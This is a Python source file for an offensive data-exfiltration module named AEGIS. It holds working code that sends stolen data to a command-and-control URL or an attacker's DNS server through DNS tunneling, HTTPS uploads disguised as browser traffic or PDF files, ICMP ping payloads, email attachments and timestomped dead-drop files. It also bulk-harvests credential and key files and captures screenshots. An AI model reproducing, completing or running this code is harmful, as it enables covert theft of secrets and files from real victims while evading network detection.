import logging
log = logging.getLogger(__name__)
#!/usr/bin/env python3
"""
AEGIS-Advanced Exfiltration Module
=====================================
Covert data exfiltration channels:
DNS tunneling, HTTPS beaconing, ICMP tunneling,
HTTP steganography, chunked multipart, base64 padding,
file-based dead-drop, compression + encryption pipeline.
"""
import os
import sys
import socket
import struct
import time
import base64
import hashlib
import hmac
import threading
import random
import zlib
import json
from pathlib import Path
from typing import Optional, List, Dict, Callable


# ══════════════════════════════════════════════
# Compression + encryption pipeline
# ══════════════════════════════════════════════

def _prepare(data: bytes, compress: bool = True,
              encrypt_key: bytes = None) -> bytes:
    """Compress and optionally encrypt data for exfil."""
    if compress:
        data = zlib.compress(data, level=9)
    if encrypt_key:
        # XOR-stream cipher (no library needed)
        key_hash = hashlib.sha256(encrypt_key).digest()
        ks = b""
        i  = 0
        while len(ks) < len(data):
            ks += hashlib.sha256(key_hash + i.to_bytes(4, "big")).digest()
            i  += 1
        data = bytes(a ^ b for a, b in zip(data, ks[:len(data)]))
    return data

def _recover(data: bytes, compressed: bool = True,
              encrypt_key: bytes = None) -> bytes:
    """Reverse of _prepare."""
    if encrypt_key:
        key_hash = hashlib.sha256(encrypt_key).digest()
        ks = b""
        i  = 0
        while len(ks) < len(data):
            ks += hashlib.sha256(key_hash + i.to_bytes(4, "big")).digest()
            i  += 1
        data = bytes(a ^ b for a, b in zip(data, ks[:len(data)]))
    if compressed:
        data = zlib.decompress(data)
    return data


# ══════════════════════════════════════════════
# DNS Tunneling
# ══════════════════════════════════════════════

class DNSTunnel:
    """
    Exfiltrate data by encoding it as subdomain labels in DNS queries.
    Each query carries ~28 bytes (base32 encoded).
    A controlled authoritative DNS server receives and reassembles.

    Protocol:
      session_id.seq_num.chunk_b32.your.domain  → DNS A query
      session_id.END.checksum.your.domain       → terminator
    """

    CHUNK_SIZE = 28   # bytes per DNS label (base32: 28 bytes → ~45 chars)

    def __init__(self, domain: str,
                 nameserver: str = None,
                 delay: float = 0.1,
                 jitter: float = 0.05,
                 encrypt_key: bytes = None):
        self.domain      = domain.rstrip(".")
        self.nameserver  = nameserver
        self.delay       = delay
        self.jitter      = jitter
        self.encrypt_key = encrypt_key
        self._session_id = os.urandom(3).hex()

    def _resolve(self, fqdn: str) -> bool:
        """Issue a DNS query for fqdn. Returns True if any response received."""
        try:
            if self.nameserver:
                # Raw UDP DNS query
                self._raw_dns_query(fqdn, self.nameserver)
            else:
                socket.getaddrinfo(fqdn, None, socket.AF_INET, socket.SOCK_DGRAM)
            return True
        except Exception:
            return True  # Even NXDOMAIN means server received the query

    def _raw_dns_query(self, fqdn: str, ns: str, port: int = 53,
                        timeout: float = 2.0):
        """Send raw DNS query via UDP."""
        txid    = os.urandom(2)
        # Standard query, RD bit set
        header  = txid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        # Encode FQDN
        qname   = b""
        for label in fqdn.split("."):
            enc = label.encode()
            qname += bytes([len(enc)]) + enc
        qname  += b"\x00"
        question = qname + b"\x00\x01\x00\x01"  # QTYPE A, QCLASS IN
        packet  = header + question

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(packet, (ns, port))
        try:
            sock.recv(512)
        except Exception as _exc:
            log.debug("unknown: %s", _exc)
        finally:
            sock.close()

    def send(self, data: bytes) -> bool:
        """
        Exfiltrate data via DNS queries.
        Returns True when all chunks sent.
        """
        payload  = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
        encoded  = base64.b32encode(payload).decode().lower().rstrip("=")
        checksum = hashlib.md5(payload).hexdigest()[:8]
        total    = len(encoded)
        seq      = 0
        sent     = 0

        for i in range(0, total, self.CHUNK_SIZE):
            chunk = encoded[i:i + self.CHUNK_SIZE]
            fqdn  = "{}.{}.{}.{}".format(
                self._session_id, seq, chunk, self.domain)
            # Truncate if label > 63 chars
            parts = fqdn.split(".")
            fqdn  = ".".join(p[:63] for p in parts)
            self._resolve(fqdn)
            seq  += 1
            sent += len(chunk)
            # Jittered delay
            jitter = random.uniform(-self.jitter, self.jitter)
            time.sleep(max(0, self.delay + jitter))

        # Send END marker with checksum
        end_fqdn = "{}.{}.{}.{}".format(
            self._session_id, "end", checksum, self.domain)
        self._resolve(end_fqdn)
        return True

    def send_file(self, filepath: str) -> bool:
        """Read file and exfiltrate via DNS."""
        try:
            with open(filepath, "rb") as f:
                return self.send(f.read())
        except Exception as e:
            print("[exfil/dns] send_file failed:", e)
            return False

    def send_chunked(self, data: bytes,
                      max_bytes_per_burst: int = 512,
                      burst_delay: float = 5.0) -> bool:
        """
        Send in small bursts to blend with legitimate DNS traffic.
        """
        chunk_size = max_bytes_per_burst
        for i in range(0, len(data), chunk_size):
            burst = data[i:i + chunk_size]
            self.send(burst)
            time.sleep(burst_delay + random.uniform(0, 2))
        return True


# ══════════════════════════════════════════════
# HTTPS / HTTP Exfiltration
# ══════════════════════════════════════════════

class HTTPSTunnel:
    """
    Exfiltrate data over HTTPS with multiple evasion techniques:
    - Fake browser User-Agent rotation
    - Base64 in cookies / custom headers
    - Multipart form upload (mimics file upload)
    - JSON payload in POST body
    - Chunked transfer encoding
    - Optional steganography in image responses
    """

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    ]

    def __init__(self, c2_url: str,
                 encrypt_key: bytes = None,
                 proxy: str = None,
                 verify_ssl: bool = True,
                 timeout: int = 30,
                 jitter_min: float = 1.0,
                 jitter_max: float = 5.0):
        self.c2_url     = c2_url.rstrip("/")
        self.encrypt_key= encrypt_key
        self.proxy      = proxy
        self.verify_ssl = verify_ssl
        self.timeout    = timeout
        self.jitter_min = jitter_min
        self.jitter_max = jitter_max
        self._session_id= os.urandom(8).hex()

        try:
            import requests
            self._requests = requests
            s = requests.Session()
            if proxy:
                s.proxies = {"http": proxy, "https": proxy}
            s.verify = verify_ssl
            self._session = s
        except ImportError:
            self._requests = None
            self._session  = None

    def _headers(self) -> Dict[str, str]:
        return {
            "User-Agent":      random.choice(self.USER_AGENTS),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
            "X-Request-ID":    os.urandom(8).hex(),
        }

    def _jitter(self):
        time.sleep(random.uniform(self.jitter_min, self.jitter_max))

    def _encode_payload(self, data: bytes) -> str:
        """Compress, encrypt, base64-encode."""
        processed = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
        return base64.urlsafe_b64encode(processed).decode()

    def send_json(self, data: bytes, filename: str = "data") -> bool:
        """POST as JSON payload."""
        if not self._session:
            return self._fallback_send(data)
        try:
            payload = {
                "id":       self._session_id,
                "filename": filename,
                "data":     self._encode_payload(data),
                "ts":       int(time.time()),
                "checksum": hashlib.md5(data).hexdigest(),
            }
            r = self._session.post(
                self.c2_url + "/upload",
                json=payload,
                headers=self._headers(),
                timeout=self.timeout,
            )
            self._jitter()
            return r.status_code in (200, 201, 204)
        except Exception as e:
            print("[exfil/https] send_json failed:", e)
            return False

    def send_form_multipart(self, data: bytes,
                             filename: str = "report.pdf") -> bool:
        """POST as multipart/form-data (mimics file upload)."""
        if not self._session:
            return self._fallback_send(data)
        try:
            processed = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
            files = {"file": (filename, processed, "application/pdf")}
            r = self._session.post(
                self.c2_url + "/api/upload",
                files=files,
                headers=self._headers(),
                timeout=self.timeout,
            )
            self._jitter()
            return r.status_code in (200, 201, 204)
        except Exception as e:
            print("[exfil/https] multipart failed:", e)
            return False

    def send_chunked_transfer(self, data: bytes,
                               chunk_size: int = 4096) -> bool:
        """Send data in chunks via separate requests."""
        total     = len(data)
        processed = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
        total_chunks = (len(processed) + chunk_size - 1) // chunk_size
        xfer_id  = os.urandom(8).hex()

        for i in range(total_chunks):
            chunk = processed[i * chunk_size:(i + 1) * chunk_size]
            payload = {
                "xfer_id":     xfer_id,
                "chunk_index": i,
                "total_chunks":total_chunks,
                "data":        base64.b64encode(chunk).decode(),
            }
            if not self._session:
                break
            try:
                self._session.post(
                    self.c2_url + "/chunk",
                    json=payload,
                    headers=self._headers(),
                    timeout=self.timeout,
                )
                self._jitter()
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
        return True

    def send_in_cookie(self, data: bytes) -> bool:
        """Hide small payload (< 2KB) in Cookie header."""
        if len(data) > 2048:
            return False
        if not self._session:
            return self._fallback_send(data)
        encoded = self._encode_payload(data)
        hdrs    = self._headers()
        hdrs["Cookie"] = "session={}; _ga={}".format(
            encoded, os.urandom(8).hex())
        try:
            self._session.get(
                self.c2_url + "/",
                headers=hdrs,
                timeout=self.timeout,
            )
            return True
        except Exception:
            return False

    def _fallback_send(self, data: bytes) -> bool:
        """Stdlib-only fallback using urllib."""
        import urllib.request
        import urllib.error
        try:
            processed = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
            encoded   = base64.urlsafe_b64encode(processed).decode()
            body      = json.dumps({"data": encoded, "id": self._session_id}).encode()
            req       = urllib.request.Request(
                self.c2_url + "/upload",
                data=body,
                headers={"Content-Type": "application/json",
                         "User-Agent": random.choice(self.USER_AGENTS)},
                method="POST",
            )
            ctx = urllib.request.ssl.create_default_context() if hasattr(urllib.request, 'ssl') else None
            if ctx and not self.verify_ssl:
                ctx.check_hostname = False
                ctx.verify_mode    = 0
            urllib.request.urlopen(req, context=ctx, timeout=self.timeout)
            return True
        except Exception as e:
            print("[exfil/https] fallback failed:", e)
            return False

    def send(self, data: bytes, filename: str = "exfil") -> bool:
        """Smart send — tries methods in order of stealth."""
        for method in [self.send_json, self.send_form_multipart, self._fallback_send]:
            try:
                if method(data):
                    return True
            except Exception as _exc:
                log.debug("send: %s", _exc)
        return False

    def send_file(self, filepath: str) -> bool:
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            return self.send(data, filename=Path(filepath).name)
        except Exception as e:
            print("[exfil/https] send_file failed:", e)
            return False


# ══════════════════════════════════════════════
# ICMP Tunneling
# ══════════════════════════════════════════════

class ICMPTunnel:
    """
    Exfiltrate data via ICMP echo request payload.
    Embeds data in the data section of ping packets.
    Requires raw socket (root/CAP_NET_RAW).
    Max ~65KB per ping (practical ~1KB chunks for stealth).
    """

    CHUNK_SIZE = 64  # bytes per ICMP packet

    def __init__(self, target_ip: str,
                 encrypt_key: bytes = None,
                 delay: float = 0.5):
        self.target      = target_ip
        self.encrypt_key = encrypt_key
        self.delay       = delay

    def _send_ping(self, data: bytes, seq: int = 0) -> bool:
        """Send a single ICMP echo request with data payload."""
        try:
            # ICMP echo request type=8, code=0
            icmp_type = 8
            icmp_code = 0
            icmp_id   = os.getpid() & 0xFFFF

            def checksum(packet: bytes) -> int:
                if len(packet) % 2 != 0:
                    packet += b"\x00"
                s = 0
                for i in range(0, len(packet), 2):
                    w = (packet[i] << 8) + packet[i + 1]
                    s += w
                s = (s >> 16) + (s & 0xFFFF)
                s += (s >> 16)
                return ~s & 0xFFFF

            header = struct.pack("!BBHHH", icmp_type, icmp_code,
                                  0, icmp_id, seq)
            payload = data
            chk    = checksum(header + payload)
            header = struct.pack("!BBHHH", icmp_type, icmp_code,
                                  chk, icmp_id, seq)

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                   socket.IPPROTO_ICMP)
            sock.settimeout(2)
            sock.sendto(header + payload, (self.target, 0))
            sock.close()
            return True
        except PermissionError:
            return False  # Need root
        except Exception:
            return False

    def send(self, data: bytes) -> bool:
        """Exfiltrate data via ICMP ping payloads."""
        payload  = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
        total    = len(payload)
        # Prepend length header
        framed   = struct.pack(">I", total) + payload
        seq      = 0
        for i in range(0, len(framed), self.CHUNK_SIZE):
            chunk = framed[i:i + self.CHUNK_SIZE]
            if not self._send_ping(chunk, seq % 65535):
                print("[exfil/icmp] raw socket failed (need root)")
                return False
            seq  += 1
            time.sleep(self.delay + random.uniform(0, 0.1))
        return True


# ══════════════════════════════════════════════
# Dead-drop file exfiltration
# ══════════════════════════════════════════════

class FileDeadDrop:
    """
    Exfiltrate data by writing to a world-readable staging directory,
    shared drive mount, or web server docroot.
    """

    def __init__(self, drop_path: str, encrypt_key: bytes = None):
        self.drop_path   = drop_path
        self.encrypt_key = encrypt_key
        os.makedirs(drop_path, exist_ok=True)

    def drop(self, data: bytes, filename: str = None) -> Optional[str]:
        """Write data to drop location."""
        fname = filename or "{}.bin".format(os.urandom(8).hex())
        path  = os.path.join(self.drop_path, fname)
        try:
            payload = _prepare(data, compress=True, encrypt_key=self.encrypt_key)
            with open(path, "wb") as f:
                f.write(payload)
            # Timestomp to blend in
            ref = "/etc/hosts" if os.path.exists("/etc/hosts") else None
            if ref:
                st = os.stat(ref)
                os.utime(path, (st.st_atime, st.st_mtime))
            return path
        except Exception as e:
            print("[exfil/deadrop] drop failed:", e)
            return None

    def collect(self) -> List[Dict]:
        """Collect all dropped files."""
        items = []
        try:
            for f in Path(self.drop_path).iterdir():
                if f.is_file():
                    try:
                        raw  = f.read_bytes()
                        data = _recover(raw, compressed=True,
                                         encrypt_key=self.encrypt_key)
                        items.append({"path": str(f), "data": data,
                                       "size": len(data)})
                    except Exception as _exc:
                        log.debug("collect: %s", _exc)
        except Exception as _exc:
            log.debug("collect: %s", _exc)
        return items


# ══════════════════════════════════════════════
# Email exfiltration
# ══════════════════════════════════════════════

class EmailExfil:
    """
    Exfiltrate data via SMTP as email attachment.
    Uses stdlib smtplib — no dependencies.
    """

    def __init__(self, smtp_host: str, smtp_port: int = 587,
                 username: str = None, password: str = None,
                 use_tls: bool = True,
                 from_addr: str = None, to_addr: str = None):
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.username  = username
        self.password  = password
        self.use_tls   = use_tls
        self.from_addr = from_addr or (username or "noreply@localhost")
        self.to_addr   = to_addr   or (username or "noreply@localhost")

    def send(self, data: bytes, subject: str = "Report",
              filename: str = "data.pdf") -> bool:
        """Send data as email attachment."""
        import smtplib
        import email.mime.multipart as _mp
        import email.mime.base as _mb
        import email.mime.text as _mt
        import email.encoders as _enc

        try:
            msg = _mp.MIMEMultipart()
            msg["From"]    = self.from_addr
            msg["To"]      = self.to_addr
            msg["Subject"] = subject

            body = _mt.MIMEText("Please find the attached report.", "plain")
            msg.attach(body)

            processed = _prepare(data, compress=True)
            att = _mb.MIMEBase("application", "octet-stream")
            att.set_payload(processed)
            _enc.encode_base64(att)
            att.add_header("Content-Disposition",
                            "attachment", filename=filename)
            msg.attach(att)

            with smtplib.SMTP(self.smtp_host, self.smtp_port,
                               timeout=30) as server:
                if self.use_tls:
                    server.starttls()
                if self.username and self.password:
                    server.login(self.username, self.password)
                server.send_message(msg)
            return True
        except Exception as e:
            print("[exfil/email] send failed:", e)
            return False


# ══════════════════════════════════════════════
# C2 upload with chunked retry
# ══════════════════════════════════════════════

def exfil_to_c2(data: bytes,
                 c2_url: str,
                 encrypt_key: bytes = None,
                 method: str = "https",
                 domain: str = None,
                 nameserver: str = None,
                 filename: str = "exfil",
                 max_retries: int = 3) -> bool:
    """
    Unified exfiltration function. Tries HTTPS then DNS fallback.
    """
    if method == "https" or method == "auto":
        tunnel = HTTPSTunnel(c2_url, encrypt_key=encrypt_key)
        for attempt in range(max_retries):
            if tunnel.send(data, filename=filename):
                print("[exfil] Sent {} bytes via HTTPS".format(len(data)))
                return True
            time.sleep(2 ** attempt)

    if (method == "dns" or method == "auto") and domain:
        tunnel = DNSTunnel(domain, nameserver=nameserver,
                            encrypt_key=encrypt_key)
        if tunnel.send(data):
            print("[exfil] Sent {} bytes via DNS".format(len(data)))
            return True

    print("[exfil] All methods failed")
    return False


def exfil_file(path: str, c2_url: str,
                encrypt_key: bytes = None,
                **kwargs) -> bool:
    """Read file and exfiltrate to C2."""
    try:
        with open(path, "rb") as f:
            data = f.read()
        fname = Path(path).name
        return exfil_to_c2(data, c2_url, encrypt_key=encrypt_key,
                            filename=fname, **kwargs)
    except Exception as e:
        print("[exfil] file read failed:", e)
        return False


def exfil_directory(dirpath: str, c2_url: str,
                     encrypt_key: bytes = None,
                     extensions: List[str] = None) -> Dict[str, bool]:
    """
    Exfiltrate all files from directory matching extensions.
    Default extensions: common credential/config files.
    """
    if extensions is None:
        extensions = [".txt", ".log", ".conf", ".config", ".json",
                       ".yaml", ".yml", ".env", ".pem", ".key",
                       ".p12", ".pfx", ".csv", ".db", ".sqlite"]
    results = {}
    for f in Path(dirpath).rglob("*"):
        if f.is_file() and (not extensions or f.suffix in extensions):
            ok = exfil_file(str(f), c2_url, encrypt_key=encrypt_key)
            results[str(f)] = ok
    return results


# ══════════════════════════════════════════════
# Screenshot / screen capture
# ══════════════════════════════════════════════

def capture_screenshot() -> Optional[bytes]:
    """Capture screenshot — tries multiple methods."""
    # Method 1: scrot (Linux)
    try:
        import subprocess, tempfile
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            r = subprocess.run(["scrot", tmp.name], capture_output=True, timeout=5)
            if r.returncode == 0:
                with open(tmp.name, "rb") as f: data = f.read()
                os.unlink(tmp.name)
                return data
    except Exception as _exc:
        log.debug("capture_screenshot: %s", _exc)
    # Method 2: Python PIL/Pillow
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, "PNG")
        return buf.getvalue()
    except Exception as _exc:
        log.debug("unknown: %s", _exc)
    return None


if __name__ == "__main__":
    print("[exfil] Module loaded")
    # Test compression pipeline
    test = b"AEGIS Advanced Exfil Test 2026 " * 100
    enc  = _prepare(test, compress=True, encrypt_key=b"testkey")
    dec  = _recover(enc, compressed=True, encrypt_key=b"testkey")
    assert dec == test, "Pipeline roundtrip failed"
    print("[exfil] Pipeline test passed ({} → {} bytes)".format(
        len(test), len(enc)))


# ════════════════════════════════════════════════════════════════════════════
# Compatibility aliases matching __init__.py exports
# ════════════════════════════════════════════════════════════════════════════

# DeadDropStager is the public API name for FileDeadDrop
DeadDropStager = FileDeadDrop

def screenshot() -> Optional[bytes]:
    """Alias for capture_screenshot() — returns screenshot as PNG bytes or None."""
    return capture_screenshot()
